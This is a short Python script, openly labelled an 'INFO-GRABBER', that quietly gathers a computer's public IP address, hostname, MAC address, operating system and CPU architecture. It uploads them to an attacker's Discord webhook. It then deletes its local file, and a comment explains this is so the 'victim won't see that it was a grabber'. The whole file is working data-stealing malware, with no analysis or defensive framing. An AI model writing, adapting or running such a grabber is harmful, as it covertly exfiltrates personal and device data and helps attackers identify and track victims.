from discord_webhook import DiscordWebhook, DiscordEmbed
import socket
import requests
import platform
import uuid
import os
import sys
# It work without it but if you have some enable it and check if it was the problem
# I commented this after the script was ready after edits and I saw no errors so idk if it is an optymalization :)
#import subprocess
#import urllib.request


#           IP ADDRESS
ip = requests.get('https://checkip.amazonaws.com').text.strip()

#           HOSTNAME
hostname = socket.gethostname()

#     OPERATING SYSTEM CHECK
if sys.platform.startswith('win'):
    user_system = 'windows'
elif sys.platform.startswith('linux'):
    user_system = 'Linux'
else:
    user_system = 'other'

# Get the MAC address as a 48-bit integer
mac_int = uuid.getnode()

# Convert the MAC address into a string
mac_str = ':'.join(['{:02x}'.format((mac_int >> i) & 0xff) for i in range(0,8*6,8)][::-1])


#############################


#     WRITES INFO INTO FILE 
f = open("z3k1wm6pf37wash4.txt", "w")
f.write('IP address: ')
f.write(ip)

f.write('\n')

f.write('HOSTNAME: ')
f.write(hostname)

f.write('\n')

f.write('MAC ADDRESS: ')
f.write(mac_str)

f.write('\n')

f.write('OPERATING SYSTEM: ')
f.write(user_system)

f.write('\n')

f.write('OPERATING SYSTEM VERSION: ')
f.write(platform.release())

f.write('\n')

f.write('CPU ARCHITECTURE: ')
f.write(platform.machine())

#f.write('\n')
#f.write('CPU INFO: ')  # doesn't show my cpu info, try if it will on your pc.
#f.write(platform.processor())

f.close()

############################

#      Discord web hook

webhook = DiscordWebhook(url='your webhook url', username="INFO-GRABBER")

with open("z3k1wm6pf37wash4.txt", "rb") as f:
    webhook.add_file(file=f.read(), filename='z3k1wm6pf37wash4.txt')

response = webhook.execute()

# Deletes locally created info file that was sent to discord so victim won't see that it was a grabber

os.remove("z3k1wm6pf37wash4.txt")
